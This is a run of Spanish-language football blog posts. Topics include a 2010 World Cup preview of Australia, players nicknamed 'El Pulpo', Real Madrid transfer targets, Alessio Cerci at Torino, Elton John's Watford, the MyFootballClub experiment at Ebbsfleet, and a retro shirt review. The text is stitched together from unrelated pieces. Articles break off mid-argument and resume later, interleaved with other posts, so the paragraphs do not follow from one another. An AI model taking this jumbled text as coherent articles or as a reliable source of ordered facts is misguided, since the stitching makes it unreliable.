todas luces, de su humilde historia.Cuatro años hace desde que Australia se asomara a la gesta y pocas cosas han cambiado en el combinado oceánico. Para bien y para mal. Mantienen los socceroos el espíritu competitivo, la sangre en la retina,  que les llevó a ser un auténtico dolor de muelas para el resto de acompañantes (Brasil, Japón y Croacia) que viajaban en aquel Grupo F en 2006. Defensa pétrea, disciplina y desempeño táctico son tres “des” a las que la selección que dirige Pim Verbeek (en su día segundo de Gus Hiddink) se aferra como a un clavo ardiendo tanto como lo hicieron sus antecesores en el pasado. Y les funciona. El problema es que no hay novedades respecto a su versión 2006. Schwarzer, Cahill, Emerton, Neill, Wilkshare, Bresciano, Grella, Culina, Kewell… El equipo es una fotocopia ajada de su versión más exitosa. Tan sólo Tim Cahill y Mark Schwarzer ofrecen la garantía de que podrán mostrarse a un nivel similar al de sus mejores años y han sufrido bajas importantes, sobre todo la de Mark Viduka en ataque.Con un centro de campo rico en medias puntas, o cuanto menos hombres con buena movilidad, resulta sorprendente la escasa riqueza ofensiva del juego australiano. Respaldando al punta, aparecen Mark Breciano (fuerza y dinamismo), Cahill (oportunismo y fuerza aérea) y Harry Kewell (clase y juego a balón parado). La solución de Verbeek es jugar a que Joshua Kennedy, poco más que un jornalero esforzado durante sus años en la Bundesliga, se trabaje los balones al poste y que visite de vez en cuando la banda. Demasiado poco. Las segundas jugadas, acechando la espalda de los centrales serán cosa de Cahill, dejando los carriles para Bresciano y la versión disminuida de aquel gran jugador que fue Harry Kewell. Grella y Jason Culina cimentarán el centro y estarán al tanto de lo que suceda también en defensa. El equipo vive de la retaguardia. Hay muestran contundencia, sobre todo Neill, pero van a pasarlo mal cuando toque correr.Con Alemania, Serbia y Ghana disputándoles los garbanzos, llegar a los octavos de final sería un rotundo éxito para Australia. Faltan mimbres futbolísticos y el grupo es de órdago. Y aunque es evidente que el fútbol está creciendo a pasos agigantados en el país, tanto en competitividad (Australia se clasificó holgadamente tras su decisión de integrar la exigente previa asiática) como en interés mediático (serán una de las selecciones más arropadas por sus aficionados en Sudáfrica) y que Australia comienza a recoger los frutos de los años de trabajo federativo, llegar al Mundial se antoja un techo más que suficiente para ellos. Claro que la misma cantinela les contamos en 2006 y tan sólo una equivocación arbitral les privó de cotas mayores…Lo mejor: El gen competitivo y justo lo que hay tras el delantero centro. Tim Cahill sobre todos los demás.Lo peor: Tras la retirada de Viduka y riqueza ofensiva en la vanguardia.Jugador a seguir: Tim Cahill. Debe poner la guinda, en un Mundial, a años de un rendimiento excepcional.Pronostico DDF: No pasan a octavos.Los 23 mundialistas:Porteros:Defensas:Centrocampistas:Atacantes: En plena fiebre  cefalópoda, con el  pulpo psíquico  enrachado de manera increíble, e inspirado por un dato certero de Álvaro Vega, esa suerte de Johnny 5 del balompié que nos ilustra a diario en twitter desde su cuenta @laligaennumeros, he considerado de justicia recordar a unos  cuantos peloteros que pasaron y pasarán a los tomos de historia futbolística  por apodarse como el ya icónico octópodo adivino. Habitualmente centrocampistas  con la misma querencia por tragar kilómetros que por acariciar el tobillo rival, son unos cuantos los futbolistas  que han crecido con el apodo de “El Pulpo” a cuestas.El mejor jugador del mundo, la Pulga, es el principio y fin de este Barcelona, el que convierte a un gran equipo en la más terminada joya que ha producido el planeta fútbol. Desde el principio tenía lo más preciado, la capacidad de eliminar contrarios, pero bajo la batuta de Pep lo ha ido adquiriendo casi todo lo que le exigiríamos al atacante perfecto: el disparo lejano a los rincones, el último pase, la capacidad de asociación, la visión de juego, las apariciones incontrolables en el área y, sobre todo, una capacidad goleadora incontenible, de depredador. Paradójicamente, quizá el único escenario en la que uno puede imaginarse una serie triunfal para el Madrid tiene que ver con alguna ausencia de Leo, ya que la única prueba que este año no ha superado el Barcelona han sido los partidos sin él, llenos de sufrimiento. Pero, ¿quién no dependería de Messi?Se quedan en el tintero los nombres de Abidal y Bojan, que han dicho adiós a la temporada. Conociendo a Guardiola, en cambio, es muy probable que alguno de los jóvenes canteranos tengan su primera oportunidad en un clásico, ya que en cuatro partidos hay mucho tiempo para todo. Dejó su impronta Jeffren cerrando el 5-0, y para los que siguen apunten el nombre de Thiago Alcántara. Especialmente para el último, el de Copa de Europa. Si cada verano es inevitable que se asocie un carrusel de futbolistas al Real Madrid, con mucho más motivo en éste, en que el club blanco viene de una temporada fracasada y el futuro es una incógnita. Vamos a comentar algunos de esos nombres, no sin antes lanzar por delante nuestra creencia de que cualquier fichaje que cierre un equipo antes de firmar a su entrenador es una muestra de anarquía e improvisación que habla muy mal de la planificación del club en cuestión. Con esto en cuenta, entremos en materia.Gareth Bale. Es el jugador que más está sonando en los medios de comunicación, y dado lo mediático de su figura y los precedentes de la directiva del Madrid, no es difícil imaginarlo en breve con la nueva publicidad de Emirates. Sin embargo, a pesar de que hablamos de un jugador de nivel estelar, los precios de 70 u 80 kilos que se están manejando suenan a un despilfarro que, además, lastraría otras operaciones quizá más necesarias.Quiero recordar a  unos pocos. Va por ti Paul.Patrick Vieira. Cerca de dos metros de pegada negra que  han  liderado a la selección francesa durante años, lo del pulpo le viene al francés por  la envergadura de sus piernas. Inacabables y siempre prestas para segar . Para entender su juego basta tan sólo leer lo que de él mismo  solía decir. “Para mi lo único que importa es la eficacia, no la  estética. Eso lo da la posición. Tengo que hacerme respetar. Siempre me  han dicho que cuanto más miedo tienes de entrar más daño te haces. Por  eso busco el contacto”. Mirar a su vitrina es para desmayarse: Mundial y  Eurocopa, tres ligas y cuatro copas con el Arsenal y cuatro scudettos  con el Inter son algunas de las chucherías que ha conseguido Vieira gracias a esos benditos perniles. El pulpo por excelencia sigue repartiendo en el  Manchester City.Javier Mascherano. El que juega con diez más al lado según el diez  por excelencia, el jefecito, también contesta cuando le gritan lo del  pulpo. A estas alturas no hay nada que descubrir de un jugador más que  contrastado. Perfil ganador, del tipo Simeone, un soldado con una  disciplina táctica y mental a la altura de los mejores medios Masche es el capitán de la albiceleste y uno de los puntales del Liverpool. Germinó en River Plate y cuando demostró que la cinco millonaria no le  pesaba deshizo la maleta en Sao Paulo, en el Corinthians al que llegó en el mismo paquete que el Apache Tévez para seguir creciendo en el West Ham y consagrarse en el arte de la contención a  las orillas del río Mersey. Un grande.Mauricio Astudillo. El pulpo Astudillo es uno de los octópodos del  césped por excelencia. Grande en la marca, dejó su impronta a base de un notable  buen hacer a ras de suelo en aquel Alavés impactante que en los 90  deslumbrara en UEFA. En Vitoria fue emblema y capitán. Pero antes de todo supo  ganarse el apodo rascando en varios y muy  infrafutboleras instituciones argentinas. Primero en Godoy Cruz y más tarde en Gimnasia y Esgrima de  Jujuy. No está disfrutando, sin embargo, de un buen final en la tierra que lo  vio nacer y actualmente se dedica a deambular por el plantel de Rosario  Central con más pena y disgusto para la hinchada que otra cosa.Juan Jayo Legario. Aun a riesgo de tornar el artículo en parabólico quiero recordar a un peruano. 37 años pateando lo que aparezca por la zona  central del rectángulo y 97 apariciones con la blanquiroja peruana, el  cuarto que más vistió la camiseta de la franja roja, contemplan la  carrera del pulpo Jayo, un clásico de Alianza de Lima y por ende, de la  Liga Peruana. Buen rascador y comprometido hasta el límite del  reglamento, Jayo Legario pasará a la posteridad por la ocurrencia de  marcarle a todo un River Plate desde el centro del campo cuando  jugaba para  Unión de Santa Fe. Marcado por el gen errante característico de aquellas latitudes  su carrera también le  llevó a probar en el Celta de Vigo y la Unión Deportiva Las Palmas.Martín  Zúñiga. La parabólica excepción que confirma que para ser pulpo no es necesario andar a patadas con el vecino. Con todos los números para ser arquero, el vascuence apellido marca a cualquiera, el mexicano de  Tampico debutó en la 92-93 con los Tigres de la UANL. Tras dejar la  disciplina auriazul levantó la Copa de Campeón con las Chivas de  Guadalajara en 1997 e incluso llegó a integrar el exitoso plantel azteca  para la Copa América del mismo año que finalizaron en tercer lugar. Celaya, Tecos, Puebla (gran año  aquel para Zúñiga salvando los muebles en el descenso), Tiburones de Veracruz y las Chivas USA, donde se  retiró, fueron los clubes donde el pulpo Zúñiga extendió sus tentáculos. Por cierto, con uno de ellos agarra el micro ahora en la Fox. “El Cerci rebelde. El Cerci arrogante. El Cerci que solo piensa en coches guapos… Soy un tío sencillo. No bebo, no fumo, no me voy de putas” Después de darle el pésame por presumir de costumbres lamentables le recordaría a Alessio Cerci que olvida una cara suya en el lloriqueo: el genio desnortado por el que la Fiorentina malgastó 4 millones de euros. Luego me tomaría una a su salud para celebrar que  le va de maravilla en el Torino. Es lo mínimo que puede hacer cualquiera con un poco de sensibilidad por las historias de futbolistas golfos, difíciles, anómalos y enormes. Los que merecen cuatro líneas.El ciclo de información sobre este señor funcionaba así no hace demasiado: cuatro ramalazos de clase de vez en cuando, algarada y justificaciones ante los micrófonos. Un mes tras otro. La carrera de Cerci se enmarañaba como sus rizos teñidos sobre la gomita del pelo. A los veintipico no conseguía escapar  de la corriente perversa que un día te vomita en la alcantarilla de la B. O peor, te convierte en un viejo arrogante que se conforma con meter unos pocos zurdazos en algún histórico del infrafútbol italiano. Quizá hubiera vuelto a Pisa para que los cuatro gatos que van al campo le abronacasen no seguir la jugada.Eran los mejores años del Watford. En su primera temporada entre los grandes llegaron a alcanzar el subcampeonato de Liga, lo que les llevó a disputar la Copa de la UEFA por primera y única vez en toda su historia. Para un modesto como el Watford, surgido desde las entrañas más profundas del fútbol inglés, aquella participación europea suponía tocar el cielo con las manos.Con los Hornets ya económicamente saneados, el cantante londinense vendió sus participaciones en el año 1987. A su salida de club, fue distinguido como Presidente Honorífico Vitalicio del mismo. Solo transcurrieron diez años alejado de la presidencia cuando Elton John tuvo que retomar su actividad como directivo en 1997, recomprando sus participaciones y aportando una nueva inyección económica a la entidad para auparlo de nuevo a la máxima categoría en la temporada 1999/2000. Su segunda relación con el club se alargó hasta el año 2002. La necesidad de un presidente con dedicación full-time en un fútbol cada vez más profesionalizado y con mayores exigencias en cuanto a la gestión de los clubes terminó propiciando su definitiva salida de Vicarage Road. Pese a todo, Sir Elton continua aún a día de hoy, cuando la familia Pozzo aparece como la gran benefactora de la entidad, siendo un importante apoyo y una referencia ineludible en Watford.Puedes comprar camisetas del Watford FC en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. ‘No eres un socio más, no eres un simple número… En realidad, eres el jefe. Están obligados a escucharte‘. ¿Qué aficionado al fútbol no ha fantaseado alguna vez en su vida con poder ser parte activa del día a día de su equipo, con poder participar en la toma de decisiones o con arrimarse al campo de entrenamiento para dar un par de consejos al míster acerca de la alineación del próximo partido? Naturalmente, o uno es el hijo de un potentado magnate del petróleo y tiene que acabar haciéndose cargo del enésimo caprichito de su progenitor, o la idea es complicado que pase mucho más allá de una frustrante partidita al Football Manager o similares. Pero no está todo perdido… ¿tienes cuarenta euros a mano?MyFootballClub es una sociedad de gestión online de clubes de fútbol, basada en los principios de la participación de todos sus miembros en la toma de decisiones y en la financiación conjunta por parte de sus asociados. MyFootballClub nació a principios del año 2007 con la idea de servir de soporte a la idea que muchos aficionados de cualquier rincón del mundo compartían sobre la gestión, tanto deportiva como financiera o institucional, de un equipo de fútbol profesional. El funcionamiento, en principio, era cosa sencilla. Con una pequeña aportación económica anual podías cualquier persona mayor de 16 años podía convertirse en copropietario del club. Dicha condición facultaba al titular para participar, vía online, en la toma de decisiones que resolverían el día a día del club. Desde el precio de las entradas del estadio hasta el equipo titular que el entrenador debía de poner sobre el césped. Al más puro estilo PC Fútbol. Tras su nacimiento, en apenas seis meses MyFootballClub consiguió sumar más de veinte mil miembros. La idea tenía futuro.Con el firme objetivo de hacerse con el control de un club de fútbol, los responsables de MyFootballClub se lanzaron a la caza y captura de un candidato. Fue entonces cuando apareció la oportunidad del Ebbsfleet United.Los cerca de treinta mil miembros que por entonces formaban ya parte de MyFootballClub hicieron una aportación de 35 libras por cabeza para conseguir reunir la cantidad necesaria para acometer la adquisición del modesto club de la pequeña localidad de Northfleet, que por aquel entonces disputaba sus partidos en la Conference National (actual Conference Premier), el quinto escalafón en la pirámide del fútbol inglés. Más de un 95% de los ‘participantes’ de MyFC votaron a favor de la adquisición del 75% del Ebbsfleet, un porcentaje muy similar al que dio por buena la gestión llevada hasta ese momento, cuando ya se habían disputado más de tres meses de la temporada 2007/08, por el técnico Liam Daish, que recibió de entrada la confianza de sus nuevos ‘dirigentes’. Todo parecía funcionar como la seda. Por temas de practicidad, se accedió (por supuesto, con una votación online entre todos los miembros) a que las alineaciones fueran decididas por el técnico, pero que éste mantendría un diálogo fluido con los representantes de MyFC a la hora de tomar sus decisiones.Los éxitos no tardaron en llegar. En esa misma temporada 2007/08, apenas unos meses después de que MyFC comenzase a gestionar el club, el Ebbsfleet United conseguía alzarse con el título del FA Trophy, una suerte de torneo copero para los clubes non-league (es decir, desde Conference hacia abajo), al derrotar al Torquay por un gol a cero. El diez de mayo de 2008. En Wembley y ante más de veinte mil seguidores, y muchos de ellos propietarios, del club. Nunca el fútbol había estado tan cerca de la gente. Nunca los seguidores se habían sentido tan responsables y partícipes de un éxito de su equipo.Sin embargo, y pese a las buenas perspectivas, la aventura de MyFC en el Ebbsfleet terminó torciéndose de manera inesperada. En su segunda temporada al frente del club, más de dos terceras partes de los miembros de la sociedad no renovaron sus suscripciones. De contar con unos fondos para su primer año de cerca de un millón de libras se pasó a no reunir ni siquiera la cantidad mínima para poder salir a competir con ciertas garantías en la Conference National. Ante tal situación, los socios que aún permanecían en MyFC se vieron obligados a realizar una nueva y más cuantiosa aportación económica. Dos años más tarde, a comienzos de la temporada 2010/11 y con el club recién descendido a Conference South, sólo poco más de tres mil miembros de los treinta mil iniciales seguían formando parte de MyFC.Ante el descontento generalizado de la afición de Stonebridge Road ante lo que consideraban poco menos que como un abandono por parte de MyFC, MyFootballClub se vio obligada a deshacerse a finales de la temporada pasada de todo el paquete de participaciones del Ebbsfleet United. Hoy, varios meses después de acabar sucumbiendo a una realidad que terminó llevándose por delante el sueño de ser propietario de un club de fútbol, MyFC ha cambiado considerablemente su razón de ser, sobreviviendo como simple patrocinador principal del Slough Town, un club amateur de la Southern Football League Division One, el octavo nivel del fútbol inglés.No ocurrirá porque el temporadón que se está marcando en el Torino actuará como ancla.Cerci, cantera del 87 en la Roma con una vida de cesiones y encontronazos en la mochila, ha hecho ocho goles en once partidos. Sin ser un killer nato estamos hablamos del mejor de Italia en la materia si no concursara Rossi. Giampiero Ventura le ha acercado al área y la respuesta de este extremo zurdo, pero que juega por la derecha un poquitín a lo Piero Fanna, se ha traducido en felicidad a porrillo para una hinchada acostumbrada al bostezo. Meroni y Lentini comienzan a aparecer en el imaginario.El entrenador del Torino conoce al personaje desde que rozaron juntos el ascenso a Primera con el Pisa en 2007 y le mima como solo en un equipo pequeño se puede atender a los genios indolentes. En el Toro todos los balones son para que los corra el 11. Hay confianza y esto deriva en la sartenada de regates preciosos, carreras y goles fabricados con asombrosa suficiencia que ha despachado Cerci en estas dos últimas temporadas. Especialmente en el arranque de la presente.Cuando jugaba en Florencia aparcó el Maserati en un lugar reservado a la policía cerca de Ponte Vecchio y se fue a comer el spaghetti. Dice la leyenda que ante la insistencia del agente invitándole a corregir su falta accedió, pero añadiendo que solo movería el bólido una vez hubiera terminado la comida. Sin despeinarse. En aquella época de indolencia y desaires se le vió pagando al club por cantarle las cuarenta a Mihajlovic (poca broma) o echando mierda sobre sus compañeros en las redes sociales con la ayuda de su novia (ejemplo de esa infantería borrega que forman las agraviadas enamoradas de futbolista). Ahora marca el empate que sirve para frenar de una vez por todas a la Roma histórica de Rudi García, cuenta para Prandelli en la absoluta y es uno de los jugadores más divertidos de ver en toda la Serie A. Incluso levanta comparaciones con Robben , exageradas eso sí, en algún tertuliano voceras. No es para tanto pero se puede decir que definitivamente Cerci ha aparcado.Foto: Torino FC Plantar un árbol, escribir un libro, tener un hijo…tonterías. Yo tengo mi propio camello y con eso me basta. Se podría decir que soy como Amy  Winehouse pero con más kilos, menos pelo de gato y más sangre que  química en mis venas. Y todo esto se lo debo a Martín, del buen  establecimiento que es Café Fútbol. El se ha convertido en mi aliado  fiel a la hora de convivir con esta adicción a las camisetas horribles  que me está llevando a la tumba. Para que os hagais una idea de la  profesionalidad de este tipo os copio el mail que recibí hace un tiempo en  mi buzón mientras rastreaba por Ebay algunos gramos de textil  en pleno síndrome de abstinencia: “Hola sergio, por si te quieres sumar  al homenaje al Forest por su ascenso, a tu manera…te envio la  posiblemente peor camiseta de su historia”. Ta ta ta ¡genio! . Un aplauso para mi Bodie Broadus particular.Y era cierto, esta cosa que están contemplando ahora, imagino asqueados,  no es como la gasolina que alimenta a la nueva diva del soul pero es buena  mierda después de todo. El vómito tejido en algodón que nos ocupa es  la camiseta que vestía el legendario Nottingham Forest, equipo de culto  donde los haya, en la temporada 1995. Stuart Pearce, Stan Collymore y Byan Roy. Cuartos de final de la UEFA en la memoria. Y yo pregunto dos cosas: ¿Tan  difícil era meterse en la mollera, artistas de Umbro, la conveniencia de que el Forest luzca de blanco impoluto cuando por alguna razón no pueda hacerlo con  su emblemática camiseta roja? ¿No es más sencillo eso que inventarse  esta chapuza digna del armario del Príncipe de Bel-Air? . Señor (Umbro) ten piedad. Una cosa es tener la desgracia de ser del Cádiz, el Villareal, el  Nantes o la selección de Brasil y tener que apechugar con el amarillo de  por vida. Pero otra bien distinta es empeñarse en vestir al cliente como un  mamarracho sin justificación aparente, sólo por epatar. Eso si, la elástica era moderna a rabiar e imagino que brotó de alguna cabeza lesionada por la fiebre por el grafitti  que se estilaba cuando yo era un crío y que lo mismo servía para adornar  un estuche que un chubasquero. Esos garabatos infantiloides sobre yema  de huevo… Por favor señores, que somos el Nottingham Forest, un montón  de almas, un montón de cariño… El Forest y no un equipo de invidentes. “En cierto modo, como en 2002, está habiendo una  extraña imbricación entre el estilo de juego de la selección y como se  sienten los franceses ahora mismo. ¡Los locos al poder! , decía un amigo  en 2008. Domenech y Sarkozy están manejando las cosas de un modo que se  supone que huele a creatividad pero que despide tan sólo el aroma de la  decandencia. Quizá el equipo francés pueda comenzar esa revolución la semana que  viene ante Sudáfrica. Este es mi consejo: vayamos a la huelga. Dejemos  que Sudáfrica marque tantos goles como quiera, 10, 20, los que sean, los  suficientes para que puedan pasar de ronda gracias al goal average. Eso sería un gesto de coraje y solidaridad digna de  aquellos  días de 1998″. Estos agrios pensamientos salen del teclado, imagino ya quebrado a estas alturas, de Laurent Dubois: profesor de  Historia y Francés en la Universidad de Duke. Dubois es editor del blog Soccer  Politics y autor de “Soccer Empire: The World Cup and the Future of France”: un ensayo sobre el colonialismo, la política y el fútbol como factor de cambio en las sociedad francesa.(ver abajo). No olvidemos que Bale juega o bien de interior, por donde se mueve con frecuencia Cristiano -el jugador con el que más se le compara, y del que aún está bastante por debajo- o bien de lateral, donde el Madrid ya tiene a Marcelo. Además, siempre es un riesgo invertir tanto en un jugador británico, considerando los problemas de adaptación que suelen padecer. Sería una inversión muy poco sensata.Arturo Vidal. De todos son sabidos los kilómetros que corre Sami Khedira en cada partido, la intensidad que le pone al juego y su dominio de la segunda jugada en ataque. Sin embargo, sería deseable para el equipo blanco, que ha sufrido graves problemas de generación de juego cuando el rival ha sido capaz de anular a Alonso, un futbolista a su lado que aunase poderío físico y capacidad de cubrir terreno con un buen pie y una cuota de goles anuales que el alemán no garantiza. Una de las mejores opciones es quizá el chileno Arturo Vidal, el pulmón que ha liberado a Pirlo para construir una Juve ganadora post-Moggigate. No por nada dijo Bronzetti que no pensaban venderlo “ni por todo el dinero del mundo”, pero ya se sabe que en fútbol manda la retórica.Toni Kroos. Aunque su potencial llevaba generando runrún en el mundillo desde aquellos años del Leverkusen, ha sido su último bienio en el Bayern el que le ha confirmado como uno de los mejores centrocampistas jóvenes de Europa. Dotado de llegada al área y un físico poderoso, se trata sobre todo de un jugador técnico que distribuye el balón con criterio y, sobre todo, entiende perfectamente el juego. Dadas sus características, podría ejercer en el puesto de Alonso, a su lado o acompañando a Luka Modric. Aunque es difícil que alguien pueda sacarlo del Bayern, el campeón de Europa es un equipo que en la actualidad “sufre” overbooking de centrocampistas, y que ha levantado la orejona con Javi Martínez y Schweinsteiger en el medio. Dicho de otro modo, Kroos no es tan imprescindible como debería por las especiales circunstancias de su club.Robert Lewandowski. Somos muchos los que llevamos tiempo creyendo que Karim Benzema necesita un nueve de referencia a su lado. No lo ha sido ni lo será Higuaín, y de un modo u otro, el Madrid deberá llenar el hueco en ataque que deje el voluntarioso argentino. Quizá la elección más natural, tanto por calidad, por rol y por adaptación hubiera sido Falcao, pero volado el colombiano a Mónaco hay que considerar otras alternativas. Además de costar menos dinero que otros arietes del mercado y garantizar una cuota de goles descomunal, se trata de un delantero moderno, que entiende a la perfección los movimientos del nueve, descuelga la pelota con suficiencia y sabe asociarse con sus compañeros, algo fundamental teniendo en cuenta los jugadores que tiene el Madrid. Además, se trata de un rematador sobrio y clínico, en la mejor tradición de Hugo Sánchez o Van Nistelrooy, que tanta fortuna hicieron en el Madrid. Seguramente, para los blancos, es una opción mejor que Cavani.Luis Suárez. Otro nombre que suena con fuerza para el equipo blanco es el de la punta de lanza actual del Liverpool, que en parte se postula a sí mismo. No hay ninguna duda sobre la calidad del futbolista, decisivo siempre en cualquier equipo en el que haya estado, aunque justo sea remarcar que no ha jugado en clubes que en la actualidad ofrezcan el máximo nivel deportivo -sí histórico-. Sin embargo, dos objeciones permiten cuestionar un posible fichaje por el Real Madrid. Por una parte, su perfil no está tan cercano al nueve clásico como los de los futbolistas mencionados más arriba, y por tanto no está claro que sea el delantero que necesite el equipo blanco y que mezcle mejor con Karim Benzema; por otro, un jugador con su historial de escándalos y polémicas quizá no sea lo más apropiado para un Madrid que viene de un periodo muy turbulento en lo que se refiere a imagen pública. Son problemas de cierta importancia que la directiva de Florentino haría bien en valorar.Isco. Aquí la opinión sobre el fichaje necesita bastantes matices. Nadie duda ya de la calidad y la proyección del mediapunta de Benalmádena; quizá el jugador español con mayor futuro de la actualidad, ha demostrado madurez para ser decisivo en Champions y humildad para ejercer aún de líder en la sub-21. La mayor objeción aquí es que en el Madrid juega una de las mayores referencias mundiales en su puesto, Mesut Özil, que además tiene 24 años y a veces da la impresión de que aún no ha llegado al cenit de su rendimiento. Sin embargo, si el Madrid ficha finalmente un entrenador que guste de compaginar enganches (tipo Spalletti, para entendernos), el potencial que muestra Isco es tan impresionante que lo convierte en un riesgo, dentro de lo que cabe, asumible. Sobre todo si, como parece, el fichaje no se iría ni a la mitad de las cifras de Bale o Neymar. Paraguay. Cuartofinalista. Un partido ganado, tres empatados y uno perdido, con tres goles a favor y dos en contra. Goleadores: Alcaraz, Vera y Riveros.Lo mejor: una brillante disposición táctica, capaz de anular a equipos a priori superiores (Italia y España sufrieron lo indecible), el rendimiento obtenido de su escasa capacidad goleadora… y bueno, Larissa Riquelme.Lo peor: que cada cuatro años brinden al mundo tostón tras tostón, hasta el punto de haber hecho suyo un estilo que aterroriza a los neutrales.La estrella: sin que sirva de precedente, elegiremos al entrenador, el Tata Martino. Convirtió a sus futbolistas casi en peones anónimos, y desarrolló una partida de ajedrez tras otra que a punto estuvo de llevar al país guaraní a semifinales.El momento: nadie sabe qué hubiera pasado si Cardozo hubiera embocado el penalti que Casillas tuvo la destreza o suerte de detener; lo que está claro es que todo hubiera pintado muy bien para los rojiblancos.Eslovaquia. Llegó a octavos de final. Un partido ganado, uno empatado y dos perdidos, cinco goles anotados y siete recibidos. Goleadores: Vittek (4) y Kopunek.Lo mejor: un fútbol académico que les sirvió para controlar el ritmo de los partidos, y la falta de complejos con la que abordaron el partido ante Italia.Lo peor: los errores defensivos que los condenaron en el choque de octavos, y la gris actuación de Hamsik, llamado a priori a ser el jugador franquicia.La estrella: Robert Vittek. Olvidado en el Ankaragücü, el goleador eslovaco llegó a Sudáfrica con el olfato a punto, y fue sensación de la primera fase. Seguramente lo veamos en una gran liga pronto.El momento: el disparo parabólico de Kopunek que suponía el tercer gol frente a Italia, cuando todos nos dimos cuenta de que la sorpresa que nunca creímos posible se iba a consumar.Nueva Zelanda. Eliminada en la primera fase. Tres empates, dos goles a favor y dos en contra. Goleadores: Reid y Smeltz.Lo mejor: su juego aéreo y su competitividad los hicieron marcharse a casa con el raro privilegio de ser el único equipo invicto del torneo.Huelga decir que siente la selección bleu como algo suyo. Consejo a la futbolerada. Como sé que ustedes se ponen un poquito autistas cuando se les mete el asunto de la pelotita entre ceja y ceja les pido que atiendan. Y que cuando un retrato arranque con aquello de “emprendedor y dirigente deportivo italiano” sigan leyéndolo. Por lo que más quieran. Porque seguramente aprenderán sobre el obrar bizarro de algún mercachifle metido a gestor del balón que se parezca a Alvaro Vitali y  además de asegurarles la risotada les salvará de un apuro. Pero dejemos eso para más adelante.El fútbol te fríe el cerebro. Hace unos años yo trabajaba en una pequeña agencia de comunicación y para compensar las tonterías que tenía que hacer a diario devoraba más pelota de la que podía digerir. Un partido tras otro. Si no me volví parabólico fue de casualidad. De aquella entrevisté a un italiano especializado en Relaciones Internacionales que debía ayudarme con una de las abundantes estupideces que como digo tenía que despachar cada día. La reunión discurría envuelta en zetas, troncos y serruchos hasta que apareció El Tema. ¿De que parte de Italia eres Luca? . “Soy de Perugia ¿lo conoces? . Sí claro, por el equipo de fútbol. Acabáramos…Cada quince días y de la mano de Classic Football Shirts, la tienda online especializada en camisetas antiguas, nos acercamos al fútbol con una perspectiva diferente. Lo hacemos desde las camisetas con las que se ha construido la historia del deporte rey.Los muy acérrimos de la pelotita entenderán bien lo que ocurre cuando en medio de una conversación moribunda de inicio (por apasionante que anduviera en ese momento el ruedo político europeo) tu interlocutor menciona El Tema. Que ves la luz. Ves la luz y hasta las espinilleras de Nakata…El fútbol te salva. “No me creo que conozcas al Perugia, ¡Son muy malos!” . Y en esos momentos uno duda si callar o hacerse el parabólico pero al final suelta un valiente “No te creas Luca, tuvieron sus buenos momentos”. Y arranca. Los armarios podridos de tu mollera comienzan a abrirse para mostrar camisas rojas de gente extraña. Y el la tira con el astro japonés y tu la devuelves con el inseminador Kaviedes, vuelve con el bisonte Ravanelli y tu que si Vryzas, Hubner… Alegría.Con unas cañas acabamos hablando hasta de Luciano Gaucci, el anterior dueño del Perugia. ¿Sabes que su presidente se fugó al Caribe y pasea de la mano de una dominicana años? . ¡No me digas, qué mangante! , contesté con impostada incredulidad aunque por supuesto ya lo sabía. Y también  que en su día fichó al hijo de Ghadaffi y a un surcoreano al que despidió fulminantemente por eliminar a Italia del Mundial 2002. Que arruinó al Perugia y por supuesto que es igualito al grandísimo Alvaro Vitali. Herramientas sociales, señores.Puedes comprar estas camisetas y cientos más en Classic Football Shirts. Con la victoria en Cagliari, deslucida y postrera todo hay decirlo, el Milan es campeón de invierno en Italia. Me gusta este Milan. Con sus limitaciones, el vértigo no aparece en el diccionario rojinegro, Allegri ha sabido imponer un sistema que fructifica porque sus futbolistas respetan la pelota por encima de todo. Si esta gente no duerme con el balón por almohada como hacía Oliver Atom poco les debe faltar y eso, en tiempos del atletismo, es de agradecer. Todavía recuerdo como en los últimos Madrid-Milan cierto locutor de radio español, noticia días atrás, exprimió como solo los peores humoristas saben hacerlo el chiste del Milan decrépito. Y no es eso.Como dicen en Italia, el Milan va. Han llegado unos cuantos cromos de postín como Ibrahimovic, Robinho y Cassano (el más brasileño de los italianos según Thiago, pese al evidente sobrepeso) para inyectar jugo de calidad a una plantilla que dependía en exceso de los destellos de Pato y además ya son varios los jóvenes que comienzan a ser útiles al más alto nivel. Strasser y Merkel, goleador y sorpresa agradable, mediocentro y creador fino respectivamente en el Arechi, son el ejemplo de ello. Sí, pintan bien los recambios en el Milan pero si me preguntan por la pieza que hace girar el motor tengo que hablar de Clarence Seedorf.Allegri confía en el holandés a la hora de construir el juego y le hace actuar indistintamente como regista, por delante de la defensa cocinando el fútbol, o como mediapunta.El maniqueísmo y el desconocimiento han convertido a este deporte en el blanco de los dardos de la intelectualidad más intransigente. A pesar de las notables excepciones -siempre a Camus en la cabeza, también Serrat o Galeano por nombrar algunas debilidades-, se sigue teniendo la idea de que el balompié es un entretenimiento idiotizante y aún es común oír eso de “no te pega que te guste el fútbol” por el mero hecho de leer libros o simplemente por hablar con cierta coherencia, esto es, sin balbucear.A rebufo de esta presión parece ganar fuerza un reverso fino, afectado, que trata de convertir al fútbol en una expresión culta, casi filosófica. No digo que haya que negar ese lado universal y reflexivo del deporte, pero desde luego no debemos despreciar lo que de tosco, enrevesado, parcial y rudimentario alberga. Huele a comida recién preparada, como si los nuevos comunicadores hayan mezclado la contextualización de Enric González, la espontaneidad de Carlin, la precisión futbolística de Segurola, los conocimientos y sensibilidad de Axel Torres. Todo metido en un potaje que pretende salvar el lenguaje y el concepto futbolístico. Si bien los resultados, bienintencionados, no terminan de cuajar por una razón obvia: ninguno de estos cuatro referentes ignoran el lado más zafio y gualdrapa de este fenómeno. Lo interiorizan, lo matizan, pero nunca se elevan hasta el punto de perder de vista el césped levantado, el olor a sudor y el plantillazo inoportuno. Mucho de lo que he leído últimamente me resulta artificial, lejano, pretendidamente ejemplarizante. No hay nada menos honesto que escribir lo que la gente quiere leer. Son buenos referentes pero da la sensación de que se ha cogido el ingrediente menos auténtico de su postulado, el más convencidamente lejano del mainstream periodístico. Si algo tienen estos cuatro escritores es haber vencido a la cotidianidad con sus mismas armas, no se han evadido, han forcejeado de tú a tú en el mismo campo y todos han ganado.La trascendencia es un funámbulo caminando sobre el vacío. Lo que quiere ir más allá tiene siempre el riesgo de quedarse a medias, de caer en la nadería. Tan loable es tratar de ir más allá como sano es valorar el resultado. La intención no es siempre lo que cuenta, al menos, no en la creación. El fútbol es de por sí lo suficientemente trágico, injusto y plástico que su puesta en altar sólo sirve para ahuyentar el sabor auténtico del espectáculo. Hay maneras de afrontar un texto sobre fútbol, puedes empezar en el punto central del campo o en las calles aledañas del estadio pero siempre hay que hacer girar las ideas en torno a la mecánica básica de una esfera incontrolable. Todo 